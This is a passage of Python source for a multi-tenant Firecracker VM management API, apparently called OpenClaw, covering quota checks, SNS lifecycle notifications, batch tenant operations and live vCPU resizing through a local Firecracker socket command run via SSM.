            Limit=limit,
        ).get("Items", [])
    except Exception as e:
        print(f"audit query failed: {e}")
        items = []
    return _resp(200, items[:limit])


# ----- Quota (#34 / issue #9, original 79000fa) -----
# QUOTAS_ENABLED / QUOTAS_MAX_* are defined at the top of the module
# (default disabled, matches README "enabled: false default — no checks").
# The post-merge regression repair (#48) accidentally re-declared them with
# a different default; that re-declaration has been removed.


def _check_quota(vcpu, mem_mb, data_disk_mb):
    """Return None if within quota, else an error string."""
    if not QUOTAS_ENABLED:
        return None
    if QUOTAS_MAX_VCPU and vcpu > QUOTAS_MAX_VCPU:
        return f"vcpu={vcpu} exceeds quota (max {QUOTAS_MAX_VCPU})"
    if QUOTAS_MAX_MEM_MB and mem_mb > QUOTAS_MAX_MEM_MB:
        return f"mem_mb={mem_mb} exceeds quota (max {QUOTAS_MAX_MEM_MB})"
    if QUOTAS_MAX_DATA_DISK_MB and data_disk_mb > QUOTAS_MAX_DATA_DISK_MB:
        return f"data_disk_mb={data_disk_mb} exceeds quota (max {QUOTAS_MAX_DATA_DISK_MB})"
    return None


# ----- SNS lifecycle notifications (#33 / issue #13, original 1f1bffa) -----
# NOTIFICATIONS_TOPIC_ARN and the sns client are defined at the top of the
# module. The post-merge regression repair (#48) accidentally re-bound them;
# that duplication has been removed.


def _publish_event(event_name, tenant_id, details):
    """Publish a tenant lifecycle event to SNS. No-op when topic not set.

    Best-effort: SNS publish failures are logged but do not break the
    underlying API operation.
    """
    if not NOTIFICATIONS_TOPIC_ARN:
        return
    try:
        msg = {
            "event": event_name,
            "tenant_id": tenant_id,
            "timestamp": _now(),
            "details": details or {},
        }
        sns.publish(
            TopicArn=NOTIFICATIONS_TOPIC_ARN,
            Subject=f"OpenClaw: {event_name} ({tenant_id})",
            Message=json.dumps(msg, default=str),
            MessageAttributes={
                "event": {"DataType": "String", "StringValue": event_name},
                "tenant_id": {"DataType": "String", "StringValue": tenant_id},
            },
        )
    except Exception as e:
        print(f"SNS publish failed (operation succeeded): {e}")


# ----- Batch tenant operations (#29 / issue #23, original d05e107) -----
_BATCH_VALID_ACTIONS = {"stop", "start", "delete", "backup"}
_BATCH_VALID_FILTER_KEYS = {"tag"}
_BATCH_MAX_IDS = 100


def batch_tenants(body=None):
    """POST /batch/tenants — apply one action to many tenants in a single call."""
    if body is None:
        return _resp(400, {"error": "missing body"})
    body = json.loads(body) if isinstance(body, str) else body
    action = body.get("action")
    if action not in _BATCH_VALID_ACTIONS:
        return _resp(400, {"error": f"action must be one of {sorted(_BATCH_VALID_ACTIONS)}"})
    ids = body.get("ids")
    flt = body.get("filter")
    if ids is not None and flt is not None:
        return _resp(400, {"error": "specify exactly one of 'ids' or 'filter'"})
    if ids is None and flt is None:
        return _resp(400, {"error": "specify exactly one of 'ids' or 'filter'"})
    if ids is not None:
        if not isinstance(ids, list):
            return _resp(400, {"error": "ids must be an array"})
        if len(ids) > _BATCH_MAX_IDS:
            return _resp(400, {"error": f"too many ids (max {_BATCH_MAX_IDS})"})
        target_ids = list(ids)
    else:
        if not isinstance(flt, dict):
            return _resp(400, {"error": "filter must be an object"})
        unknown = set(flt.keys()) - _BATCH_VALID_FILTER_KEYS
        if unknown:
            return _resp(400, {"error": f"unknown filter key(s): {sorted(unknown)}"})
        target_ids = _resolve_filter(flt)
    succeeded, failed = [], []
    for tid in target_ids:
        try:
            tenant = tenants_table.get_item(Key={"id": tid}).get("Item")
            if not tenant:
                failed.append({"id": tid, "error": "tenant not found"})
                continue
            if action == "delete":
                result = delete_tenant(tid, {})
            else:
                result = tenant_action(tid, action)
            if result.get("statusCode", 500) >= 400:
                err = json.loads(result.get("body", "{}")).get("error", "unknown error")
                failed.append({"id": tid, "error": err})
            else:
                succeeded.append({"id": tid, "action": action})
        except Exception as e:
            failed.append({"id": tid, "error": str(e)})
    return _resp(200, {"succeeded": succeeded, "failed": failed})


def _resolve_filter(flt):
    """Convert filter dict → list of matching tenant ids (excludes soft-deleted)."""
    items = tenants_table.scan(
        FilterExpression="#s <> :d",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":d": "deleted"},
    ).get("Items", []) or []
    items = [it for it in items if it.get("status") != "deleted"]
    tag_expr = flt.get("tag", "")
    if tag_expr and ":" in tag_expr:
        k, v = tag_expr.split(":", 1)
        items = [it for it in items if (it.get("tags") or {}).get(k) == v]
    elif tag_expr:
        items = []
    return [it["id"] for it in items]


def _resp(code, body):
    return {
        "statusCode": code,
        "headers": {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Headers": "Content-Type,x-api-key,Authorization",
        },
        "body": json.dumps(body, default=str),
    }


# ────────────────────────────────────────────────────────────
# Live VM resize (#35 / issue #16, original b3d48cf)
# ────────────────────────────────────────────────────────────


def tenant_resize(tenant_id, body):
    """POST /tenants/{id}/resize — hot-add vCPU on a running tenant."""
    if body is None:
        return _resp(400, {"error": "missing body"})
    body = json.loads(body) if isinstance(body, str) else body
    new_vcpu = body.get("vcpu")
    new_mem = body.get("mem_mb")
    if new_vcpu is None and new_mem is None:
        return _resp(400, {"error": "specify vcpu (memory live-resize not supported)"})
    if new_mem is not None:
        return _resp(400, {
            "error": "memory live-resize is not supported; "
                     "stop the tenant, recreate with new mem_mb, then start"
        })
    try:
        new_vcpu = int(new_vcpu)
    except (TypeError, ValueError):
        return _resp(400, {"error": "vcpu must be an integer"})
    item = tenants_table.get_item(Key={"id": tenant_id}).get("Item")
    if not item:
        return _resp(404, {"error": "tenant not found"})
    if item.get("status") != "running":
        return _resp(400, {"error": f"tenant must be running (current: {item.get('status')})"})
    current_vcpu = int(item.get("vcpu", 0))
    if new_vcpu <= current_vcpu:
        return _resp(400, {
            "error": f"vcpu must be greater than current ({current_vcpu}); "
                     "Firecracker cannot shrink — restart to decrease"
        })
    quota_err = _check_quota(new_vcpu, int(item.get("mem_mb", 0)),
                              int(item.get("data_disk_mb", 0)))
    if quota_err:
        return _resp(400, {"error": quota_err})
    host_id = item.get("host_id", "")
    if not host_id:
        return _resp(400, {"error": "tenant has no host assigned"})
    host = hosts_table.get_item(Key={"instance_id": host_id}).get("Item")
    if not host:
        return _resp(400, {"error": f"host {host_id} not found"})
    delta = new_vcpu - current_vcpu
    allocatable = int(int(host["total_vcpu"]) * CPU_OVERCOMMIT_RATIO)
    free = allocatable - int(host["used_vcpu"])
    if delta > free:
        return _resp(400, {
            "error": f"insufficient host capacity: need {delta} more vCPU, "
                     f"host has {free} free (allocatable={allocatable}, used={host['used_vcpu']})"
        })
    vm_dir = f"/data/firecracker-vms/{tenant_id}"
    cmd = (f'curl -sf --unix-socket {vm_dir}/fc.sock -X PATCH http://localhost/machine-config '
           f'-H "Content-Type: application/json" '
           f"-d '{{\"vcpu_count\":{new_vcpu},\"mem_size_mib\":{int(item['mem_mb'])}}}'")
    if not _ssm_run(host_id, cmd, timeout=30):
        return _resp(502, {"error": "Firecracker machine-config PATCH failed; tenant unchanged"})
    now = _now()
    tenants_table.update_item(
        Key={"id": tenant_id},
        UpdateExpression="SET vcpu = :v, updated_at = :t",
        ExpressionAttributeValues={":v": new_vcpu, ":t": now},
    )
    hosts_table.update_item(
        Key={"instance_id": host_id},
        UpdateExpression="SET used_vcpu = used_vcpu + :v",
        ExpressionAttributeValues={":v": delta},
    )
    return _resp(200, {
        "id": tenant_id,
        "vcpu": new_vcpu,
        "mem_mb": int(item["mem_mb"]),
        "delta": delta,
    })
